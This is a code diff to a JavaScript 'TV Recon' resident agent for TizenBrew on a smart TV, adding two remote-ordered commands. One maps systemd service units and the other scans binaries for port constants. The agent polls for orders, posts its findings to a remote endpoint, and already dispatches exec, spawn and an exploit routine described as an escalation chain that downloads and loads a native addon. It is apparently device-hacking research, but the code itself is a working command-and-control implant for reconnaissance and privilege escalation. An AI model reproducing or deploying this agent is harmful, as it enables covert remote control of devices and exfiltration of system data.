@@ -1,4 +1,4 @@
-/* TV Recon v12 — LONG-LIVED RESIDENT AGENT.
+/* TV Recon v13 — LONG-LIVED RESIDENT AGENT.
  * Runs in the TizenBrew service vm context. No crash markers, no throws —
  * a single resident module with a polling loop. Orders from /mode:
  *   {"action":"recon"}   light status posts
@@ -33,8 +33,8 @@ function T(fn) { try { return fn(); } catch (e) { return 'ERR:' + (e && e.messag
 function read(f, n) { return T(function () { return fs.readFileSync(f, 'utf8').slice(0, n || 6000); }); }
 function ls(d) { return T(function () { return fs.readdirSync(d).slice(0, 250); }); }
 
-console.log('TV Recon v12 resident agent starting');
-post('v12-online', { time: new Date().toISOString(), uid: process.getuid(), node: process.version });
+console.log('TV Recon v13 resident agent starting');
+post('v13-online', { time: new Date().toISOString(), uid: process.getuid(), node: process.version });
 
 function getMode(cb) {
     try {
@@ -356,6 +356,75 @@ function doFdscan(mode) {
     } catch (e) { post('fdscan-err', String(e)); }
 }
 
+function doUnitmap(mode) {
+    /* read all .service units, extract Description + ExecStart */
+    try {
+        var dir = '/usr/lib/systemd/system';
+        var files = T(function () { return fs.readdirSync(dir); });
+        if (!(files instanceof Array)) { post('unitmap-err', String(files)); return; }
+        var units = files.filter(function (f) { return f.indexOf('.service') !== -1; });
+        var out = [];
+        units.forEach(function (u) {
+            var c = T(function () { return fs.readFileSync(dir + '/' + u, 'utf8'); });
+            if (typeof c !== 'string') return;
+            var d = c.match(/Description=(.*)/);
+            var e = c.match(/ExecStart=(.*)/);
+            if (e) out.push({ unit: u.slice(0, -8), desc: d ? d[1].slice(0, 90) : '', exec: e[1].trim().slice(0, 120) });
+        });
+        var CH = 25;
+        for (var i = 0; i < out.length; i += CH) {
+            post('unitmap', { chunk: i / CH, total: Math.ceil(out.length / CH), list: out.slice(i, i + CH) });
+        }
+        post('unitmap-done', { units: units.length, mapped: out.length });
+    } catch (e) { post('unitmap-err', String(e)); }
+}
+
+function doGrepdir(mode) {
+    /* stateful dir sweep: each tick processes a batch of files, resumes next tick.
+     * mode: {action:'grepdir', dir:'/usr/bin', patterns:['A00F','EB1F','8823','8C3C'], maxsize: 2000000, batch: 40}
+     * patterns are hex of LITTLE-ENDIAN u16 port constants. */
+    try {
+        var stateFile = '/tmp/.grepdir_' + String(mode.dir).replace(/\//g, '_');
+        var st = null;
+        if (fs.existsSync(stateFile)) {
+            st = JSON.parse(fs.readFileSync(stateFile, 'utf8'));
+        }
+        if (!st || st.dir !== mode.dir) {
+            var files = T(function () { return fs.readdirSync(mode.dir); });
+            if (!(files instanceof Array)) { post('grepdir-err', String(files)); return; }
+            st = { dir: mode.dir, files: files, idx: 0, matches: 0, pats: mode.patterns, maxsize: mode.maxsize || 2000000, batch: mode.batch || 40 };
+        }
+        var maxread = st.maxsize;
+        var n = 0;
+        while (st.idx < st.files.length && n < st.batch) {
+            var f = st.files[st.idx]; st.idx++;
+            var p = st.dir + '/' + f;
+            var sz = T(function () { return fs.statSync(p).size; });
+            if (typeof sz !== 'number' || sz === 0 || sz > maxread) continue;
+            if (T(function () { return fs.statSync(p).isDirectory(); }) === true) continue;
+            var data = T(function () { return fs.readFileSync(p); });
+            if (!(data instanceof Buffer)) continue;
+            for (var pi = 0; pi < st.pats.length; pi++) {
+                var pat = new Buffer(st.pats[pi], 'hex');
+                var at = data.indexOf(pat);
+                if (at !== -1) {
+                    var ctx = data.slice(Math.max(0, at - 24), at + 26);
+                    post('grepdir-hit', { file: p, pattern: st.pats[pi], at: at, ctx: ctx.toString('base64') });
+                    st.matches++;
+                }
+            }
+            n++;
+        }
+        fs.writeFileSync(stateFile, JSON.stringify(st));
+        if (st.idx >= st.files.length) {
+            post('grepdir-done', { dir: st.dir, files: st.files.length, matches: st.matches });
+            try { fs.unlinkSync(stateFile); } catch (e) {}
+        } else {
+            post('grepdir-progress', { dir: st.dir, done: st.idx, total: st.files.length, matches: st.matches });
+        }
+    } catch (e) { post('grepdir-err', String(e)); }
+}
+
 function doExploit(mode) {
     /* Choreographed escalation train, one boot:
      * 1. download N-API addon  2. require() it  3. read constructor marker
@@ -461,6 +530,8 @@ function tick() {
                 else if (mode.action === 'read64') doRead64(mode);
                 else if (mode.action === 'netprobe') doNetprobe(mode);
                 else if (mode.action === 'fdscan') doFdscan(mode);
+                else if (mode.action === 'unitmap') doUnitmap(mode);
+                else if (mode.action === 'grepdir') doGrepdir(mode);
                 else if (mode.action === 'dlopentest') doDlopentest(mode);
                 else if (mode.action === 'exec') doExec(mode);
                 else if (mode.action === 'spawn') doSpawn(mode);
